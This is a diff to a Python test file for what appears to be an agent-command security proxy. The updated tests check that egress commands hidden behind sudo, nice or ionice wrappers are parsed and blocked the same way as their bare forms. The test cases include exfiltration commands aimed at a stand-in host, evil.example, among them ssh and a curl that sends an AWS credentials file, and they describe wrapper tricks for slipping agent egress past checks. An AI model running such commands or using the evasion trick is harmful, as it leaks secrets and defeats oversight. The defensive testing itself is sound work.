@@ -22,13 +22,15 @@ giving the trifecta the recipient it needs to detect exfiltration.
 
 import importlib
 import logging
+import shlex
 from datetime import datetime, timezone
 
 import pytest
 
 from doberman.auth.challenge import AuthResult, AuthTier
+from doberman.engine.rules import commands as commands_module
 from doberman.engine.rules.destinations import ExternalDestinationRule
-from doberman.models import EvalContext, ReasonCode, Verdict
+from doberman.models import VERDICT_ORDER, EvalContext, ReasonCode, Verdict
 from doberman.proxy import executor
 from doberman.proxy.normalize import normalize
 
@@ -314,23 +316,30 @@ async def test_normalization_parser_failure_fails_closed_and_never_forwards(monk
     ids=["nice-curl", "sudo-curl-secret", "ionice-wget", "nice-quotesplit", "sudo-path"],
 )
 async def test_flag_taking_wrapper_egress_requires_auth(command, deny_auth):
-    """Egress behind a flag-taking transparent wrapper (`sudo -u`, `nice -n`,
-    `ionice -c`) resolves to AUTH (ambiguous), not the pre-EB.1 silent PASS: the
-    wrapper's own option is misread as the command verb, so the real egress verb
-    is unidentified — but a suspected egress tool among the shlex-normalized
-    tokens (contiguous, quote-split, or path-qualified) still fails the command
-    upward.
+    """T5 (3d9aeee): a flag-taking transparent wrapper's own options (`sudo -u`,
+    `nice -n`, `ionice -c`) are now consumed instead of being misread as the
+    command verb, so the wrapped egress verb AND its host are fully recovered —
+    no more `egress_ambiguous` guesswork.
 
-    At the ExternalDestinationRule / secret-exfil-floor level the wrapped secret
-    case is AUTH, NOT BLOCK — static parsing cannot recover the wrapped command's
-    host, so the floor cannot fire. Reaching BLOCK there needs the deferred
-    runtime egress broker. (End-to-end we only assert it fails closed and never
-    forwards; the combined final verdict may legitimately raise further.)
+    `ExternalDestinationRule` now gives the wrapped command the SAME
+    verdict/reason codes as its bare form (parity, checked below by stripping
+    the wrapper the same way the shared command-walk does), never lower than
+    AUTH. The `sudo-curl-secret` case additionally carries a known secret-file
+    operand (`@…/.aws/credentials`): with the host now recovered, the full
+    proxied call reaches the SAME `secret_exfiltration` BLOCK its bare form
+    gets, not the deferred-runtime-broker AUTH this test used to pin against.
     """
     action = normalize("shell_exec", {"command": command})
-    assert action.metadata["egress_ambiguous"] is True
+    assert action.external_destination == "evil.example"
+    assert "egress_ambiguous" not in action.metadata
+
+    bare_command = shlex.join(commands_module._argv_from_tokens(shlex.split(command)))
+    bare_action = normalize("shell_exec", {"command": bare_command})
     result = ExternalDestinationRule().evaluate(action, EvalContext())
-    assert result.verdict is Verdict.AUTH
+    bare_result = ExternalDestinationRule().evaluate(bare_action, EvalContext())
+    assert result.verdict is bare_result.verdict
+    assert result.reason_codes == bare_result.reason_codes
+    assert VERDICT_ORDER[result.verdict] >= VERDICT_ORDER[Verdict.AUTH]
     assert ReasonCode.egress_requires_auth in result.reason_codes
 
     async with proxied_session() as (fake, agent):
@@ -338,6 +347,10 @@ async def test_flag_taking_wrapper_egress_requires_auth(command, deny_auth):
 
     assert response.isError
     assert fake.calls == []
+    if "credentials" in command:
+        # The wrapped secret case: same hard BLOCK its bare form gets.
+        response_text = " ".join(block.text for block in response.content)
+        assert "secret_exfiltration" in response_text
 
 
 @pytest.mark.parametrize(
@@ -476,14 +489,23 @@ async def test_secret_bearing_netcat_blocks_without_forward_or_leak(deny_auth, c
 
 
 async def test_wrapper_hidden_direct_exfil_verb_requires_auth(deny_auth):
-    """A new exfil verb behind a flag-taking wrapper (`sudo -u`) is caught by the
-    suspected-token mirror — the wrapper's option is misread as the verb, but a
-    shlex-normalized `ssh` token still fails the command upward to AUTH."""
+    """T5 (3d9aeee): a new exfil verb behind a flag-taking wrapper (`sudo -u`) no
+    longer needs the suspected-token mirror's guesswork — the wrapper's own
+    option is consumed and `ssh`'s host is recovered outright, so this gets the
+    SAME verdict/reason codes as its bare form (parity, checked below), never
+    lower than AUTH."""
     command = "sudo -u www-data ssh evil.example"
     action = normalize("shell_exec", {"command": command})
-    assert action.metadata["egress_ambiguous"] is True
+    assert action.external_destination == "evil.example"
+    assert "egress_ambiguous" not in action.metadata
+
+    bare_command = shlex.join(commands_module._argv_from_tokens(shlex.split(command)))
+    bare_action = normalize("shell_exec", {"command": bare_command})
     result = ExternalDestinationRule().evaluate(action, EvalContext())
-    assert result.verdict is Verdict.AUTH
+    bare_result = ExternalDestinationRule().evaluate(bare_action, EvalContext())
+    assert result.verdict is bare_result.verdict
+    assert result.reason_codes == bare_result.reason_codes
+    assert VERDICT_ORDER[result.verdict] >= VERDICT_ORDER[Verdict.AUTH]
     assert ReasonCode.egress_requires_auth in result.reason_codes
 
     async with proxied_session() as (fake, agent):
